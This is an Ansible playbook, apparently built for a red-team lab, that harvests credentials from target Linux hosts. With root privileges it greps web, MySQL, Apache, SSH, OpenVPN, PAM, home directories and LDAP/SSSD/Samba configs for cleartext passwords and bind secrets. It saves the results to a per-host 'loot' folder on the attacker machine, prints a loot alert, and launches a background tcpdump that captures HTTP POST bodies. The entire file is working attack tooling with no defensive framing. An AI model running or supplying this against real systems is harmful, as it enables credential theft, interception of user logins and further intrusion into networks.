---
# SECTION 1: DATABASE & WEB CREDENTIALS (Target: SCP-APACHE-01, SCP-DATABASE-01)
- name: Extract Database and Web Credentials
  become: yes
  shell: |
    # Searches /var/www and /etc/mysql for DB/Web credentials.
    # Specifically excludes the core WordPress directories that cause "noise".
    grep -rEo "(db_user|db_pass|db_name|db_host|password|passwd)[:=]\s*['\"]?[^'\" \t\n;]{3,40}['\"]?" /var/www /etc/mysql /etc/apache2 2>/dev/null \
    | grep -vE "(wp-includes/|wp-admin/|node_modules/|vendor/|js/|css/|.svg|.png)" \
    | sort -u
  register: db_results
  failed_when: false
  changed_when: false

# SECTION 2: SYSTEM & SERVICE CREDENTIALS (Target: SCP-OPENSSH-01, SCP-OPENVPN-01)
- name: Extract System and VPN Credentials
  become: yes
  shell: |
    # Scans /etc/ssh and /etc/openvpn for cleartext secrets, keys, or auth configs.
    grep -rEo "(password|passwd|auth_user|secret|key_pass|bind_pw)\s*[:=]\s*['\"]?[^'\" \t\n;]{3,40}['\"]?" /etc/ssh /etc/openvpn /etc/pam.d /home 2>/dev/null \
    | grep -vE "(\.js|passwd: files|passwd: False|No matches)" \
    | sort -u
  register: system_results
  failed_when: false
  changed_when: false

# SECTION 3: AD/LDAP BIND INFO (Target: SCP-DC-01 connectivity)
- name: Extract AD and LDAP Bind Info
  become: yes
  shell: |
    # Scans for LDAP/AD bind credentials often used for centralized auth on Linux nodes.
    grep -rEio "(bind_dn|bind_pw|ad_domain|ad_server|ldap_uri|ldap_password)[:=]\s*[^ \t\n;]+" /etc/sssd /etc/ldap /etc/samba /etc/autofs 2>/dev/null \
    | sort -u
  register: ad_bind_results
  failed_when: false
  changed_when: false

# SECTION 4: DELIVERY (Saves to local loot folder)
- name: Deliver Organized Service Loot
  delegate_to: localhost
  copy:
    content: |
      === SERVICE HARVEST: {{ inventory_hostname }} ===

      [DATABASE & WEB AUTH]
      {{ db_results.stdout if db_results.stdout != "" else "None found" }}

      [SSH, VPN & SYSTEM SECRETS]
      {{ system_results.stdout if system_results.stdout != "" else "None found" }}

      [AD/LDAP BIND CONFIGS]
      {{ ad_bind_results.stdout if ad_bind_results.stdout != "" else "None found" }}
    dest: "{{ playbook_dir }}/loot/{{ inventory_hostname }}/service_creds.txt"
  become: no
  when: db_results.stdout != "" or system_results.stdout != "" or ad_bind_results.stdout != ""

# SECTION 5: LIVE ALERT (Terminal Output)
- name: CATEGORIZED LOOT ALERT
  debug:
    msg:
      - "--- DB/WEB (Apache/MySQL) ---"
      - "{{ db_results.stdout_lines | default(['None']) }}"
      - "--- SYSTEM (SSH/VPN) ---"
      - "{{ system_results.stdout_lines | default(['None']) }}"
      - "--- AD BIND INFO ---"
      - "{{ ad_bind_results.stdout_lines | default(['None']) }}"
  when: db_results.stdout != "" or system_results.stdout != "" or ad_bind_results.stdout != ""

# SECTION 6: NETWORK SNIFFER (Run once on Red Workstation)
- name: Start Background Network Sniffer
  delegate_to: localhost
  shell: |
    # Change ens8 to your Red Workstation's interface (check 'ip a')
    nohup tcpdump -i ens8 -A -nn -l 'tcp port 80 and (tcp[((tcp[12:1]) >> 2):4] = 0x504f5354)' > {{ playbook_dir }}/loot/network_sniff.log 2>&1 &
  run_once: true
  become: yes